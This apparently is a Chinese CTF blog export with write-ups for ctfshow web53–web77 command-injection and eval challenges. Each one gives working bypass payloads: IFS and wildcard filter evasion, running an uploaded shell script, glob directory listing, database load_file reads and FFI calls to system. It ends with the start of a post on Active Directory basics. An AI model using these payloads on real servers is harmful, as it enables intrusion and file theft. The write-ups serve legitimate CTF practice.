class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">少了对$的过滤，多了对&lt;和&gt;的过滤<br>?c=nl$IFS/fla&#x27;&#x27;g%7C%7C<br></code></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla?.php<br></code></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=paste$&#123;IFS&#125;fla?.php<br>?c=/bin/?at$&#123;IFS&#125;f???????#/bin/?at就是cat<br>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt#把flag.php重命名为a.txt，然后直接访问a.txt即可<br></code></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">把字母过滤了，但是还保留了数字<br><br>1.使用base64进行匹配<br>把flag.php的内容以base64输出了<br>?c=/???/????64 ????.???<br>相当于/bin/base64 flag.php<br><br>2.bzip2命令<br>将flag文件进行压缩，然后再访问flag.php.bz2下载<br>?c=/???/???/????2 ????.???<br></code></pre></td></tr></table></figure><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">数字也过滤了，没有过滤.和/<br>运用.(进行)执行sh命令<br></code></pre></td></tr></table></figure><p>首先利用下面的表单上传随便一个小文件。（表单可以直接f12修改html插入网页</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://ae82ef6f-deed-491d-bebf-7498e32cc9b1.challenge.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传文件抓包，发送到Repeater模块。有两处进行修改：</p><p>把文件内容改成想要执行的命令：</p><p><code>#!/bin/sh</code><br><code>ls</code><br>添加get参数：</p><p><code>?c=.%20/???/????????[@-[]</code></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">p神文章</a></p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">可以利用特性来构建数字，Linux内<br><br>echo $&#123;_&#125;：返回上一次命令的执行结果，若上一次没有命令输出0<br>可用<br>$&#123;_&#125;=&quot;&quot;<br>$(($&#123;_&#125;))=0<br>$((~$(($&#123;_&#125;))))=-1<br>然后拼接出-36在进行取反<br><br>payload:<br>?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<br>这个得到的就是36，因为flag在36.php里<br></code></pre></td></tr></table></figure><h3 id="web58-web65"><a href="#web58-web65" class="headerlink" title="web58-web65"></a>web58-web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">php.ini在后台对system,shell_exec等常见命令执行函数进行过滤<br>可以调用php内置函数进行文件读取<br>常见文件读取函数：<br>file_get_contents   <br>fread<br>fgets<br>fgetss<br>file<br>parse_ini_file<br>readfile    <br>highlight_file  <br>show_source <br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">payload:<br>c=echo highlight_file(&#x27;flag.php&#x27;);<br>c=show_source(&quot;flag.php&quot;);<br>c=highlight_file(&quot;flag.php&quot;);<br></code></pre></td></tr></table></figure><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">发现flag不在flag.php<br>执行<br>c=print_r(scandir(&quot;/&quot;));<br>发现flag.txt<br>查看flag.txt<br>c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">题面一样但是print_r被禁了，换成 var_dump即可<br>c=var_dump(scandir(&quot;/&quot;));<br>c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h3 id="web68-web70"><a href="#web68-web70" class="headerlink" title="web68-web70"></a>web68-web70</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require<br><br>payload: c=var_dump(scandir(&quot;/&quot;));include(&quot;/flag.txt&quot;);<br></code></pre></td></tr></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>你要上天吗？<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">$s = ob_get_contents();//得到缓冲区的数据。<br>ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。<br><br>可以利用exit9);停止后面的程序<br><br>payload：c=require(&quot;/flag.txt&quot;);exit()<br></code></pre></td></tr></table></figure><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>参考<a href="https://www.cnblogs.com/meng-han/p/16846015.html">ctfshow web72(绕过open_basedir) - hithub - 博客园 (cnblogs.com)</a></p><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p><strong>glob</strong>遍历目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>url编码</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">c=%3F%3E%3C%3Fphp%0A%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().&#x27;%20&#x27;)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E<br></code></pre></td></tr></table></figure><p>得到flag.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>拿flag</p><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>同web73</p><h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p><strong>glob</strong>遍历目录先得到文件名flag35.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span>=%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>a%<span class="hljs-number">3</span>Dnew%<span class="hljs-number">20</span>DirectoryIterator(%<span class="hljs-number">22</span>glob%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F*%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aforeach(%<span class="hljs-number">24</span>a%<span class="hljs-number">20</span>as%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>f)%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>Becho(%<span class="hljs-number">24</span>f-%<span class="hljs-number">3</span>E__toString().&#x27;%<span class="hljs-number">20</span>&#x27;)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>Aexit(<span class="hljs-number">0</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure><p>然后利用PDO连接数据库load_file读取文件</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,<br>&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)<br>&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-<br>&gt;getMessage();exit(0);&#125;exit(0);<br></code></pre></td></tr></table></figure><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>同web75，文件名为flag36.txt</p><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">c=<span class="hljs-variable">$ffi</span> = <span class="hljs-title function_">FFI::cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span><span class="hljs-comment">;</span><br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-params">system</span>(<span class="hljs-variable">$a</span>)<span class="hljs-comment">;</span><br>访问<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透</title>
    <link href="/2024/07/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2024/07/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="域的基础知识和域环境的搭建"><a href="#域的基础知识和域环境的搭建" class="headerlink" title="域的基础知识和域环境的搭建"></a>域的基础知识和域环境的搭建</h3><p><strong>域</strong>（Domain）是一个有安全边界的计算机集合（安全边界的意思是，在两个域中一个域的用户无法访问另一个域的资源）。可以简单的把域理解为全面的工作组。域的安全管理控制机制更加严格，用户想要访问域内的资源，必须以合法的身份登录域，用户在域中所拥有的权限还取决与用户在域内的身份。</p><h4 id="域的几种环境："><a href="#域的几种环境：" class="headerlink" title="域的几种环境："></a><strong>域的几种环境</strong>：</h4><p><strong>单域</strong>：单域就是一个域，通常一个小公司一个域就够了。一个域内有两台服务器，一台作为域控制器，另一台当备份。</p><p><strong>父域和子域</strong>：在网络中出于管理以及其他需求，需要在网络中划分多个域。第一个域称为父域，其他域称为子域。</p><p><strong>域树</strong>：多个域建立信任关系的集合。一个域控制器只能控制本域，不能访问或管理其他域，两个域之间相互访问需要建立信任关系。</p><p><strong>域森林</strong>：是指多个域树通过建立信任关系组成的集合。通过域树之间的信任关系，可以管理和使用整个域森林中的资源。</p><p><img src="/images/neiwang/1.png"></p><h4 id="域名服务器DNS："><a href="#域名服务器DNS：" class="headerlink" title="域名服务器DNS："></a><strong>域名服务器DNS</strong>：</h4><p>是因特网使用的命名系统，用来把便于人们记忆的具有特定含义的主机名转换为便于机器处理的IP地址</p><h4 id="域术语："><a href="#域术语：" class="headerlink" title="域术语："></a><strong>域术语：</strong></h4><p>**DC:**域控，域的创建者</p><p><strong>域管理：</strong>域控上的管理员</p><p><strong>AD活动目录：</strong>Active 